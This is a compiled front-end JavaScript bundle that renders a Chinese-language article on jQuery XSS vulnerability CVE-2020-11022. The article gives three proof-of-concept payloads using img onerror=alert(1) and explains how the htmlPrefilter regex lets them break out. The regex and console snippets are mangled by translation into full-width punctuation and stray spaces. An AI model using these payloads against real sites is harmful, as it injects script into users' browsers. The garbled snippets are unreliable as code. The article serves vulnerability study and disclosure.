(window.webpackJsonp=window.webpackJsonp||[]).push([[632],{1344:function(s,t,a){s.exports=a.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313095322217.8f6d8421.png"},3044:function(s,t,a){"use strict";a.r(t);var r=a(63),e=Object(r.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"jquery-xss漏洞-cve-2020-11022"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#jquery-xss漏洞-cve-2020-11022"}},[s._v("#")]),s._v(" jQuery XSS漏洞 CVE-2020-11022")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("据NVD描述：在大于或等于1.2且在3.5.0之前的jQuery版本中，即使执行了消毒（sanitize）处理，也仍会执行将来自不受信任来源的HTML传递给jQuery的DOM操作方法（即html()、.append()等），从而导致xss漏洞。")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("3.5.0 > jQuery >= 1.2")]),t("br"),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("a-alert",{attrs:{type:"success",message:"在线复现地址， 可以通过观察变化了解漏洞, https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html",description:"",showIcon:""}}),s._v(" "),t("br"),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[s._v("PoC "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("style"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("style "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("img src"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("x onerror"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("alert"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" \n\nPoC "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2.")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Only jQuery "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("x affected"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("img alt"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"<x"')]),s._v(" title"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/><img src=x onerror=alert(1)>"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n\nPoC "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("3.")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("option"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("style"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("option"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("select"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("img src"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("x onerror"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("alert"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("style"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br")])]),t("p",[t("img",{attrs:{src:a(1344),alt:"img"}})]),s._v(" "),t("p",[s._v("PoC 1和PoC 2具有相同的根本原因。在中"),t("code",[s._v(".html()")]),s._v("，作为参数传递的HTML字符串将传递到 "),t("a",{attrs:{href:"https://api.jquery.com/jQuery.htmlPrefilter/",target:"_blank",rel:"noopener noreferrer"}},[s._v("$ .htmlPrefilter（）"),t("OutboundLink")],1),s._v("方法。该"),t("code",[s._v("htmlPrefilter")]),s._v("处理用于替换自闭合标签等进行到，通过使用以下正则表达式："),t("code",[s._v("<tagname **/>**``<tagname ></tagname>")])]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("rxhtmlTag = / <（?! area | br | col | embed | hr | img | input | link | meta | param）（（[[ww：-] +）[^>] *）\\ /> / gi\n[。 ..]\nhtmlPrefilter：function（html）{\n  return html.replace（rxhtmlTag，“ <$ 1> </ $ 2>”）;\n}\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("p",[s._v("如果PoC 1的HTML通过此替换，则输出将是：")]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("> $ .htmlPrefilter（'<style> <style /> <img src = x onerror = alert（1）>'）\n<“ <style> <style> </ style> <img src = x onerror = alert（1） >“\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[s._v("黄色部分是替换的字符串。由于此替换，"),t("code",[s._v("<style />")]),s._v("样式元素内部被替换"),t("code",[s._v("<style ></style>")]),s._v("为，结果是，之后的字符串从样式元素中被踢出。之后，"),t("code",[s._v(".html()")]),s._v("将替换的HTML分配给"),t("code",[s._v("innerHTML")]),s._v("。在这里，"),t("code",[s._v("<img ...>")]),s._v("字符串变成了实际的img标签，并触发了onerror事件。")]),s._v(" "),t("p",[s._v("顺便说一下，上述正则表达式在3.x之前的jQuery中使用。从3.x开始，使用了另一个经过稍加修改的正则表达式")]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("rxhtmlTag = / <（?! area | br | col | embed | hr | img | input | link | meta | param）（（[[az] [^ \\ / \\ 0> \\ x20 \\ t \\ r \\ n \\ f] *）[^>] *）\\ /> / gi\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("此更改引入了另一个XSS向量，该向量可能仅由更多基本元素和属性导致XSS。通过此更改引入了PoC 2的向量。它仅适用于jQuery3.x。")]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("> $ .htmlPrefilter（'<img alt =“ <x” title =“ /> <img src = x onerror = alert（1）>”>'）\n<“ <img alt =” <x“ title =”> < / x“> <img src = x onerror = alert（1）>”>“\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[s._v("在这种情况下，属性值上的 img 字符串被踢出并发生XSS。")])],1)}),[],!1,null,null,null);t.default=e.exports}}]);